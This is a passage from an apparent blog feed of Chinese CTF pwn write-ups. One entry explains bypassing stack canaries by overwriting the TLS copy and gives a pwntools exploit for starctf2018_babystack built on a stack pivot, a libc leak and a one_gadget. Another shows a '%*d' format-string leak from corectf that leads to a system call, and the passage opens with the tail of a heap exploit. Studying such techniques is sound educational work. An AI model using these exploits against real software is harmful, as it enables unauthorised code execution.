class="line">add(0,0x88,b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">add(1,0x88,p64(system))</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">2025HGAME</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>TLS劫持过canary</title>
    <link href="https://www.thir0th.xyz/posts/d7e62ac2.html"/>
    <id>https://www.thir0th.xyz/posts/d7e62ac2.html</id>
    <published>2025-04-19T09:13:35.000Z</published>
    <updated>2025-04-19T15:57:50.249Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pth-create"><a href="#pth-create" class="headerlink" title="pth_create"></a>pth_create</h1><p>CTFwiki:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</span><br></pre></td></tr></table></figure><h2 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h2><p><a href="https://xz.aliyun.com/t/13074?time__1311=GqmhBKqIxGxBMx%2BoEDcWwP%2B34R2PoD">TLS_bypass_Canary - 先知社区 (aliyun.com)</a></p><p><a href="https://www.cnblogs.com/CH13hh/p/18296983">劫持TLS绕过canary &amp;&amp; 堆和栈的灵活转换 - CH13hh - 博客园 (cnblogs.com)</a></p><font style="color:rgb(35, 38, 59);">什么是TLScanary？</font><font style="color:rgb(35, 38, 59);">TLScanary 是一种在 Pwn（主要是二进制漏洞利用）中常见的技术，专门用于处理 TLS 保护的二进制文件。在安全竞赛（例如 CTF）和漏洞利用场景中，攻击者需要应对目标程序的多层安全机制，其中 TLS 是一种常见的保护措施。TLScanary 结合了 TLS 协议与堆栈保护（stack canary）技术，增加了攻击难度。</font><font style="color:rgb(35, 38, 59);">可见TLS和canary有着不可分割的关系</font><font style="color:rgb(35, 38, 59);">TLS的基本概念（pwn canary中）</font><font style="color:rgb(35, 38, 59);">TLS 是一种用于在线程本地存储数据的机制。每个线程都有自己的 TLS 区域，用于存储与该线程相关的特定数据。</font><font style="color:rgb(35, 38, 59);">在堆栈保护方面，TLS 常被用于存储堆栈 canary 值，这是一种防止缓冲区溢出攻击的安全措施。</font><font style="color:rgb(35, 38, 59);">堆栈 canary 是一种在函数返回地址之前插入的特殊值，用于检测堆栈溢出。如果缓冲区溢出覆盖了 canary 值，程序会在返回前检测到不一致，并终止执行，防止恶意代码执行。</font><font style="color:rgb(35, 38, 59);">其实对于多线程的canary来说，每个线程的canary都是独立存在的，当一个线程被创建时，操作系统会为该线程分配一个独立的 TLS 区域。这个区域通常通过某种线程控制块（TCB）来管理，每个线程都有一个独立的 TCB。</font><font style="color:rgb(35, 38, 59);">在多线程环境中，每个线程的堆栈上都会有一个独立的 canary 值。操作系统或运行时库在为每个线程分配堆栈时，会在堆栈的适当位置插入一个 canary 值。</font><font style="color:rgb(77, 77, 77);">pthread_create 说白了就是线程id放下了数组，然后创建的线程走start那个函数</font><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;pthread.h&gt;</span></span><br><span class="line"><span class="built_in">int</span> pthread_create(</span><br><span class="line">                 pthread_t *restrict tidp,   //新创建的线程ID指向的内存单元。</span><br><span class="line">                 const pthread_attr_t *restrict attr,  //线程属性，默认为NULL</span><br><span class="line">                 void *(*start_rtn)(void *), //新创建的线程从start_rtn函数的地址开始运行</span><br><span class="line">                 void *restrict arg //默认为NULL。若上述函数需要参数，将参数放入结构中并将地址作为arg传入。</span><br><span class="line">                  );</span><br><span class="line"></span><br></pre></td></tr></table></figure><font style="color:rgb(77, 77, 77);">pthread_join 使一个线程等待另一个线程结束</font><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> pthread_join(pthread_t thread, void **value_ptr);</span><br><span class="line">thread：等待退出线程的线程号。</span><br><span class="line">value_ptr：退出线程的返回值。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="适用条件："><a href="#适用条件：" class="headerlink" title="适用条件："></a>适用条件：</h2><p>pth_create创造的子进程中可以溢出大量字节，一般为0x900,要覆盖fs+0x28的canary</p><p>一般结合栈迁移来使用</p><p>调试 fsbase</p><p><a href="https://grxer.github.io/2023/03/26/TLS-Hijack/">TLS劫持过canary(TLS Hijack Bypass Canary) (grxer.github.io)</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1723553204255-5891a608-40d4-44c2-8f34-4e8e3c105e61.png" alt=""></p><h2 id="来个例题"><a href="#来个例题" class="headerlink" title="来个例题"></a>来个例题</h2><font style="color:rgb(33, 37, 41);">starctf2018_babystack</font><font style="color:rgb(33, 37, 41);">有个0x10000的溢出字节，覆盖后执行栈迁移泄露libc_base，把栈迁到bss并构造一次read，最后打one_gadget</font><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1723553119658-84a5b867-3214-4ac8-8539-f3587b4cc188.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1723553129176-c0e06097-1dd6-412a-8f56-5c8d1fda0424.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">pr = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/root/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span>)    </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.27.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,28835)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss=<span class="number">0x602010</span></span><br><span class="line">leave_ret=<span class="number">0x400A9B</span></span><br><span class="line">rdi=<span class="number">0x0000000000400c03</span></span><br><span class="line">rsi_r15=<span class="number">0x0000000000400c01</span></span><br><span class="line">rl(<span class="string">&quot;How many bytes do you want to send?&quot;</span>)</span><br><span class="line">bug()</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0x1900</span>))</span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1010</span>+p64(bss-<span class="number">8</span>)+p64(rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0</span>)+p64(rsi_r15)+p64(bss)+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(leave_ret)</span><br><span class="line">payload=payload.ljust(<span class="number">0x1900</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line">libc_base=get_addr64()-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pr(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">ogg=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget=libc_base+ogg[<span class="number">2</span>]</span><br><span class="line">s(p64(one_gadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><font style="color:rgb(35, 38, 59);"></font><font style="color:rgb(35, 38, 59);"></font>]]></content>
    
    
    <summary type="html">TLS劫持过canary</summary>
    
    
    
    <category term="canary" scheme="https://www.thir0th.xyz/categories/canary/"/>
    
    
    <category term="pwn" scheme="https://www.thir0th.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>fmt中%*d的利用</title>
    <link href="https://www.thir0th.xyz/posts/1bb30b9a.html"/>
    <id>https://www.thir0th.xyz/posts/1bb30b9a.html</id>
    <published>2025-04-19T09:13:35.000Z</published>
    <updated>2025-04-19T16:15:20.332Z</updated>
    
    <content type="html"><![CDATA[<p>corectf的一道题，见识到了格式化字符串的新用法%*d</p><p>指针残留，由不规范使用函数造成。</p><p>printf(“%*d”,&amp;a,&amp;b) 格式化字符串在rdi，a和b没有规定但会取rsi rdx中的值</p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/43448046/1722575576346-a39674ea-bb70-4ca5-99a2-6aa5300f2689.jpeg" alt=""></p><p>do_printf函数中，只允许读入三个字节，printf here的rsi会残留到第二次printf,第二个printf此时rsi是一个占栈地址，数很大，输出会把缓冲区填满，缓冲区最后有libc地址，%s会直接把libc地址打印出来，拿到libc后直接输入system(调试有点费CPU，第一次遇到虚拟机卡死)</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722575384708-1f6f2c67-9410-44b8-b21e-06fa02b13c79.png" alt=""><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722575721265-4b11ded9-d96d-49e5-97e1-aa9e6d8c1376.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722575944381-ce16043b-4f70-4303-a974-de388757ee45.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line">pr = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)    </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;b *$rebase(0x1100)&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] process 1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2. call\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%*d&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] process 2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2. call\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] process 3&quot;</span>)</span><br><span class="line">libc = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">pr(<span class="built_in">hex</span>(libc))</span><br><span class="line">system=libc-<span class="number">0x19a6f0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] process 4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2. call\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">fmt中%*d的利用</summary>
    
    
    
    <category term="canary" scheme="https://www.thir0th.xyz/categories/canary/"/>
    
    
    <category term="pwn" scheme="https://www.thir0th.xyz/tags/pwn/"/>
    
  </entry>
  
</feed>
